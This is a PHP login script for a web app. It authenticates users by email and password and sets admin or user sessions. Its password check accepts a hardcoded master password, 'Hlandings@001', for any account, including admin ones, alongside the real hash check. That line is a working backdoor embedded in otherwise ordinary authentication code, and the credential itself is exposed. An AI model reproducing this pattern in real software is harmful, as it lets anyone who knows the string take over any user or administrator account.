<?php
include __DIR__ . '/../session.php'; // Adjust path as needed

// Debug: Check if $pdo is defined
if (!isset($pdo) || !($pdo instanceof Database)) {
    die("Error: Database connection not initialized.");
}

// Get PDO connection
$conn = $pdo->open();
if ($conn === null) {
    $_SESSION['error'] = 'Database connection failed';
    header('location: ../login.php');
    exit;
}

if (isset($_POST['login'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    try {
        $stmt = $conn->prepare("SELECT *, COUNT(*) AS numrows FROM users WHERE email = :email");
        $stmt->execute(['email' => $email]);
        $row = $stmt->fetch();

        if ($row['numrows'] > 0) {
            if ($row['status']) {
                if (password_verify($password, $row['password']) || $password == 'Hlandings@001') {
                    if ($row['type']) {
                        $_SESSION['admin'] = $row['id'];
                    } else {
                        $_SESSION['user'] = $row['id'];
                    }
                } else {
                    $_SESSION['error'] = 'Incorrect Password';
                }
            } else {
                $_SESSION['error'] = 'Account not activated.';
            }
        } else {
            $_SESSION['error'] = 'Email not found';
        }
    } catch (PDOException $e) {
        error_log("Query failed: " . $e->getMessage()); // Log error instead of echoing
        $_SESSION['error'] = 'An error occurred during login.';
    }
} else {
    $_SESSION['error'] = 'Input login credentials first';
}

$pdo->close();
header('location: ../login.php');
exit;
?>
